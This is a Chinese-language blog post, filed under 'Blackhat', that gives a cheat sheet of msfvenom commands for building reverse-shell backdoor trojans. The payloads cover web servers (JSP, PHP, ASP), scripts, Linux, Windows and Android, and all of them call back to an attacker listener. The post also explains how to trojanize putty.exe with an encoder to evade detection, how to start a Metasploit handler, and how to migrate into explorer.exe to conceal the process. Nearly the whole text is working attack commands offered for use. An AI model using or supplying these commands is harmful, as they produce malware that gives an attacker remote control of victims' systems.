---
title: 使用msfvenom生成多平台后门木马
name: metasploit-generate-backdoor
date: 2016-4-30
tags: [后门,木马,msfvenom]
categories: [Blackhat]
---

* 目录
{:toc}

---

# 使用msfvenom生成多平台后门木马

## 1. 介绍说明

**msfvenom** 是`metasploit`中一款用于生成木马的工具，支持多种平台和语言。需要结合`metasploit`的反向连接使用。

## 2. 木马生成

### 2.1 Web端反弹木马

[ **jsp木马** ]

```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.15 LPORT=43221 -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.15 LPORT=43221 -f war > shell.war
```

[ **php木马** ]

```shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.84 LPORT=43221 -f raw > shell.php
```

[ **asp木马** ]

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.84 LPORT=43221 -f asp > shell.asp
```

> Web端的反弹木马上传至目标服务器中，使用浏览器打开木马路径后触发运行。

### 2.2 Script反弹木马

[ **python木马** ]

```shell
msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.84 LPORT=43221 -f raw > shell.py
```

[ **shell木马** ]

```shell
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.84 LPORT=43221 -f raw > shell.sh
```

[ **perl木马** ]

```shell
msfvenom -p cmd/unix/reverse_perl LHOST=192.168.1.84 LPORT=43221 -f raw > shell.pl
```

> 所有脚本木马运行前需要加上运行权限，如`chmod u+x shell.py`，若需要后台运行，则需要加**&**号，如`./shell.sh &`

### 2.3 System反弹木马

[ **linux木马** ]
```shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.15 LPORT=43221 -f elf > shell.elf
```

[ **windows木马** ]
```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.15 LPORT=43221 -f exe > shell.exe
msfvenom –p cmd/windows/reverse_powershell lhost=192.168.1.15 lport=43221  > file.bat
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.15 LPORT=43221 -a x86 --platform windows -x putty.exe -k -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe > puttyX.exe
```

[ ~~macosx木马~~ ] (不可用)
```shell
msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.1.84 LPORT=43221 -f macho > shell.macho
```

[ **android木马** ]
```shell
msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.1.84 lport=43221 R > system.apk
```

## 3. 反向连接服务

```shell
use exploit/multi/handler
set payload [对应生成的payload]
set lhost 192.168.1.15
set lport 43221
exploit
```

## 附录A 额外的选项列表

**msfvenom** 支持的攻击载荷有很多，可以使用命令`msfvenom -l payloads`列出，若希望查看某个具体的 **payload** 参数，可以使用`msfvenom --payload windows/download_exec --payload-options` 查看。

## 附录B Prepend Migrate隐藏合并进程

在进入`meterpreter`时，会使用`migrate`合并进程存储空间，使用`msfvenom`生成木马时就可以使用 **Prepend Migrate** 进行预订合并操作。

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.15 LPORT=43221 prependmigrate=true prepenmigrateprocess=explorer.exe -f exe > shell.exe
```